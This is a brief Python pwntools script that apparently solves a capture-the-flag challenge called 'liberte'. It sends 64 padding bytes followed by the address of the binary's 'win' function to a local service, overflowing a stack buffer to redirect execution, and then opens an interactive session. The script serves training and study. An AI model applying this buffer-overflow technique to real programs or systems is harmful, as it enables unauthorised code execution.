#!/usr/bin/env python3

from pwn import *

#r = process("../dist/liberte")
r = remote("localhost", 10203)
context.binary = e = ELF("../dist/liberte")

r.recv()
payload = b"A" * 64 + p64(e.symbols["win"])
r.sendline(payload)
r.interactive()
